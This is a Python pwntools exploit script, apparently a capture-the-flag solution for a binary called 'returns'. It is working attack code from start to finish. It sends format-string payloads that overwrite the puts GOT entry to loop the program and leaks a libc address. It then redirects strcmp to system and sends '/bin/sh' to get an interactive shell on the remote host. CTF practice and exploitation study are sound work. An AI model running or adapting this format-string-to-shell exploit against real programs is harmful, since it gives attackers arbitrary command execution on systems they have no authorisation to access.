#!/usr/bin/env python

from pwn import *

local = 0

if local:
	env = {"LD_PRELOAD": os.path.join(os.getcwd(), "../libc.so.6")}
	r = process("./returns", env=env)
	# gdb.attach(r, '''
	# 	set disable-randomization off
	# 	b *0x4012a7
	# 	c
	# 	''')
else:
	r = remote("shell.actf.co", 19307)

libc = ELF("../libc.so.6")

r.recvuntil("return?")

PRINTF_GOT		= 0x404038
PUTS_GOT		= 0x404018
MAIN			= 0x4011a6
STRCMP_GOT		= 0x404048

# input in 8th pos

payload = ''
payload += "%57x%12$n".rjust(16)
payload += "%4450x%13$hn".rjust(16)
payload += p64(PUTS_GOT+2 + 0x40000000) # the last byte gets nulled
payload += p64(PUTS_GOT)
r.sendline(payload)

r.recvuntil("with you.")

payload = ''
payload = '%2$p'.rjust(8)
r.sendline(payload)

r.recvuntil("sell you a")
leak = r.recvuntil(".",drop=True).strip()
leak = int(leak, 16)
print hex(leak)

SAMPLE = 0x7ffff7dd3780
PUTS_LIBC = 0x7ffff7a7c690
PUTS_OFFSET = libc.symbols['puts']

libc_base = leak - (SAMPLE - PUTS_LIBC) - PUTS_OFFSET
SYSTEM = libc_base + libc.symbols['system']
print "System: " + hex(SYSTEM)

MIDDLE = (SYSTEM & 0xffff0000) >> 16
LOWER = (SYSTEM & 0xffff)

print "Middle: " + hex(MIDDLE)
print "Lower: " + hex(LOWER)

payload = ''
payload += "%{}x%12$hn".format(MIDDLE - 3).rjust(16)
payload += "%{}x%13$hn".format(LOWER - MIDDLE - 3).rjust(16)
payload += p64(STRCMP_GOT+2 + 0x40000000) # the last byte gets nulled
payload += p64(STRCMP_GOT)
r.sendline(payload)

r.sendline("/bin/sh")

r.interactive()
